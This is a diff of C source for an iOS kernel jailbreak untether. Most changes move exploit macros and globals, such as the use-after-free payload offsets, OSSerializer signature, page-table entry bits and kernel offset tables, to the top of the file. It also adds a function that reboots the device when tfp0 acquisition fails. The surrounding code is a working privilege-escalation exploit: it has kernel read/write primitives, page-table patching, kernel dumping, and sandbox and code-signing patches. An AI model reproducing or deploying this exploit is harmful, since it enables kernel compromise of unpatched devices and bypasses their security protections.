@@ -5,17 +5,42 @@
 #include <assert.h>
 #include <sys/stat.h>
 #include <sys/types.h>
-#include <fcntl.h>
 #include <sys/syscall.h>
 #include <sys/kauth.h>
 #include <sys/mount.h>
-#include <spawn.h>
 #include <sys/utsname.h>
+#include <spawn.h>
+#include <fcntl.h>
 #include <pthread.h>
 
 #include <mach/mach.h>
-
 #include <IOKit/IOKitLib.h>
+
+#include "patchfinder.h"
+
+#define NEWFILE  (O_WRONLY|O_SYNC)
+#define CONSOLE "/dev/console"
+
+#define PAYLOAD_TO_PEXPLOIT (-76)
+#define PEXPLOIT_TO_UAF_PAYLOAD 8
+#define kOSSerializeBinarySignature "\323\0\0"
+#define WRITE_IN(buf, data) do { *(uint32_t *)(buf+bufpos) = (data); bufpos+=4; } while(0)
+
+#define TTB_SIZE            4096
+#define L1_SECT_S_BIT       (1 << 16)
+#define L1_SECT_PROTO       (1 << 1)        /* 0b10 */
+#define L1_SECT_AP_URW      (1 << 10) | (1 << 11)
+#define L1_SECT_APX         (1 << 15)
+#define L1_SECT_DEFPROT     (L1_SECT_AP_URW | L1_SECT_APX)
+#define L1_SECT_SORDER      (0)            /* 0b00, not cacheable, strongly ordered. */
+#define L1_SECT_DEFCACHE    (L1_SECT_SORDER)
+#define L1_PROTO_TTE(entry) (entry | L1_SECT_S_BIT | L1_SECT_DEFPROT | L1_SECT_DEFCACHE)
+#define L1_PAGE_PROTO       (1 << 0)
+#define L1_COARSE_PT        (0xFFFFFC00)
+#define PT_SIZE             256
+#define L2_PAGE_APX         (1 << 9)
+
+#define CHUNK_SIZE 0x800
 
 char *lockfile;
 int fd;
@@ -24,8 +49,16 @@ uint32_t cpipe;
 uint32_t pipebuf;
 clock_serv_t clk_battery;
 clock_serv_t clk_realtime;
+unsigned char pExploit[128];
 vm_offset_t vm_kernel_addrperm;
 uint32_t write_gadget;
+
+uint32_t* offsets = NULL;
+
+uint32_t tte_virt;
+uint32_t tte_phys;
+uint32_t flush_dcache;
+uint32_t invalidate_tlb;
 
 const char *lock_last_path_component = "/tmp/.lock";
 
@@ -136,14 +169,6 @@ unsigned char uaf_payload_buffer[] = {
     0x00, 0x00, 0x00, 0x00, // [24] address of "BX LR" code fragment
 };
 
-unsigned char pExploit[128];
-
-#define PAYLOAD_TO_PEXPLOIT (-76)
-#define PEXPLOIT_TO_UAF_PAYLOAD 8
-
-#define kOSSerializeBinarySignature "\323\0\0"
-#define WRITE_IN(buf, data) do { *(uint32_t *)(buf+bufpos) = (data); bufpos+=4; } while(0)
-
 
 enum koffsets {
     offsetof_OSSerializer_serialize,   // OSSerializer::serialize
@@ -189,8 +214,6 @@ uint32_t koffsets_S5L8950X_12H321[] = {
     0x8c,       // proc_t::p_ucred
 };
 
-uint32_t* offsets = NULL;
-
 uint32_t koffset(enum koffsets offset){
     if (offsets == NULL) {
         return 0;
@@ -215,9 +238,6 @@ void offsets_init(void){
     }
 }
 
-#define NEWFILE  (O_WRONLY|O_SYNC)
-#define CONSOLE "/dev/console"
-
 void init(void){
     int fd;
     fd = open(CONSOLE,NEWFILE,0644);
@@ -236,7 +256,6 @@ void init(void){
     
     printf("\n");
 }
-
 
 void initialize(void) {
     kern_return_t kr;
@@ -472,29 +491,6 @@ void write_primitive(uint32_t addr, uint32_t value) {
     exec_primitive(write_gadget, addr, value);
 }
 
-#define TTB_SIZE            4096
-
-#define L1_SECT_S_BIT       (1 << 16)
-#define L1_SECT_PROTO       (1 << 1)        /* 0b10 */
-#define L1_SECT_AP_URW      (1 << 10) | (1 << 11)
-#define L1_SECT_APX         (1 << 15)
-#define L1_SECT_DEFPROT     (L1_SECT_AP_URW | L1_SECT_APX)
-#define L1_SECT_SORDER      (0)            /* 0b00, not cacheable, strongly ordered. */
-#define L1_SECT_DEFCACHE    (L1_SECT_SORDER)
-#define L1_PROTO_TTE(entry) (entry | L1_SECT_S_BIT | L1_SECT_DEFPROT | L1_SECT_DEFCACHE)
-
-#define L1_PAGE_PROTO       (1 << 0)
-#define L1_COARSE_PT        (0xFFFFFC00)
-
-#define PT_SIZE             256
-
-#define L2_PAGE_APX         (1 << 9)
-
-uint32_t tte_virt;
-uint32_t tte_phys;
-uint32_t flush_dcache;
-uint32_t invalidate_tlb;
-
 void patch_page_table(int hasTFP0, uint32_t tte_virt, uint32_t tte_phys, uint32_t flush_dcache, uint32_t invalidate_tlb, uint32_t page) {
     uint32_t i = page >> 20;
     uint32_t j = (page >> 12) & 0xFF;
@@ -658,9 +654,6 @@ void do_exploit(uint32_t kernel_base){
     
 }
 
-#include "patchfinder.h"
-#define CHUNK_SIZE 0x800
-
 void dump_kernel(vm_address_t kernel_base, uint8_t *dest, size_t ksize) {
     for (vm_address_t addr = kernel_base, e = 0; addr < kernel_base + ksize; addr += CHUNK_SIZE, e += CHUNK_SIZE) {
         pointer_t buf = 0;
@@ -785,7 +778,6 @@ void unjail8(uint32_t kbase){
     uint32_t sb_patch = kbase + find_sb_patch(kbase, kdata, ksize);
     uint32_t memcmp_addr = find_memcmp(kbase, kdata, ksize);
     uint32_t vn_getpath = find_vn_getpath(kbase, kdata, ksize);
-    
     uint32_t csops_addr = kbase + find_csops(kbase, kdata, ksize);
     uint32_t csops2_addr = kbase + find_csops2(kbase, kdata, ksize);
     
@@ -942,6 +934,12 @@ void load_jb(){
     
 }
 
+void failed(void){
+    
+    printf("[-] failed to execute untether. rebooting.\n");
+    reboot(0);
+}
+
 int main(void){
     
     init();
@@ -961,6 +959,7 @@ int main(void){
         
     } else {
         printf("[-] Failed to get tfp0\n");
+        failed();
         return -1;
     }
     
